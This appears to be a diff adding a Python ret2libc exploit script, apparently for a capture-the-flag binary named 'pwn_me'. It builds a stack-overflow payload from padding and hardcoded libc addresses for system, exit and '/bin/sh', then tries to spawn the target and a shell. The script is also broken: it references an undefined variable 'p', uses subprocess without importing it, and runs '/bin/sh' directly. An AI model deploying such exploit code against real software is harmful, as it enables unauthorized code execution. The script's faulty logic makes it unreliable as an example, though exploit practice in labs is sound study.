@@ -1,0 +1,43 @@
+import struct
+import pexpect
+import time
+
+padding = 32
+base_a = 0xf7d4a000
+bin_sh_a = base_a + 0x0015910b
+syst_a = base_a + 0x0003a950
+exit_a = base_a + 0x0002e7c0
+syst_a_str = hex(syst_a)
+print("system address : ", syst_a_str)
+print("Exit address : ", hex(exit_a))
+print("/bin/sh address : ", hex(bin_sh_a))
+
+syst_a = struct.pack("<I", syst_a)
+bin_sh_a = struct.pack("<I", bin_sh_a)
+exit_a = struct.pack("<I", exit_a)
+
+buff = b"A" * padding
+buff += syst_a
+buff += exit_a
+buff += bin_sh_a
+
+with open('inp', 'wb') as f:
+	f.write(buff)
+
+
+proc = pexpect.spawn('./pwn_me')
+p.expect(b'\n')
+p.expect(b'\n')
+real_system_addr = int(p.before.split(b'0x')[-1].strip(),16)
+
+ret = 139
+#while True:
+print("")
+print("system address : ", syst_a_str)
+# Run the binary
+#ret = subprocess.run("./pwn_me < inp", shell=True, capture_output=True)
+ret = subprocess.run("/bin/sh", shell=True, capture_output=True)
+print(ret)
+
+
+
